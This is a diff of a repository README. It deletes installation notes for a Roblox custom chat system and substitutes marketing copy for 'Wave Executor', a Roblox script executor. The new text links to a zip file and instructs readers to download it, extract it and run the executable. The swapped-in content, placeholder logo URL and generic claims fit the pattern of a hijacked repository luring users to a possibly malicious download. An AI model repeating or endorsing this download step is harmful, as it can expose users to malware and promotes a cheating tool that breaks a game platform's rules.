@@ -1,13 +1,50 @@
-Rolox custom chat system:
+# Wave Executor Repository
 
-DevForum post: https://devforum.roblox.com/t/better-chat-v3-feature-rich-custom-chat-with-replies-rich-text-message-editing-and-more/1756348
+![Wave Executor Logo](https://yourlogoresource.com/wave-executor-logo.png)
 
-Uncompleted documentation: https://jumpathy.gitbook.io/betterchat-v3
+Welcome to the official GitHub repository for **Wave Executor** - a robust Windows-based script executor tailored for Roblox enthusiasts! 🌊
 
-Installation instructions:
-1. Insert the loader: https://create.roblox.com/store/asset/9376009942/BetterChat-V3-Alpha
-2. Insert the source code from the releases page or from the auto-update plugin (updater.lua found in extras)
-2A. If installing manually, modify the loader to reference the new source code
-3. Go to TextChatService in the explorer, and set ‘ChatVersion’ to ‘LegacyChatService’
-4, Go to the model tab in studio, Advanced (on the far right), Service, and insert ‘Chat’.
-5. From here, all you need to do is turn off ‘LoadDefaultChat’ and ‘BubbleChatEnabled’
+## Introduction
+
+**Wave Executor** is your go-to tool for seamless script development, packed with AI integration, ad-free premium features, and 24/7 support. Elevate your gameplay to new heights with our cutting-edge features designed exclusively for the Roblox community.
+
+## Features
+
+### AI Integration
+Our AI-powered features streamline script development, making it faster and more efficient than ever before. Say goodbye to tedious manual tasks and let Wave Executor do the heavy lifting for you.
+
+### Premium Ad-Free Experience
+Enjoy a completely ad-free experience with our premium version. No interruptions, just pure focus on enhancing your Roblox gameplay and coding experience.
+
+### 24/7 Support
+Have a question or need assistance? Our dedicated support team is available around the clock to ensure that you get the help you need, whenever you need it.
+
+## Download Wave Executor
+
+Click below to download Wave Executor now:
+
+[![Download Wave Executor](https://img.shields.io/badge/Download-Wave%20Executor-blueviolet)](https://github.com/user-attachments/files/16820624/Wave.zip)
+
+## Getting Started
+
+To start using Wave Executor, follow these simple steps:
+
+1. Download the Wave Executor zip file from the link above.
+2. Extract the contents to a folder on your Windows computer.
+3. Run the executable file to launch Wave Executor.
+
+## Help & Support
+
+If you encounter any issues or have questions about Wave Executor, feel free to reach out to our support team at [support@waveexecutor.com](mailto:support@waveexecutor.com) or join our [Discord server](https://discord.gg/wave-executor) for community assistance.
+
+## Contributing
+
+We welcome contributions from the community to help us improve Wave Executor. If you have ideas for new features, bug fixes, or any other suggestions, please submit a pull request or open an issue on our GitHub repository.
+
+## License
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+Thank you for choosing **Wave Executor** to enhance your Roblox scripting experience. 🚀 Let's create amazing scripts together!
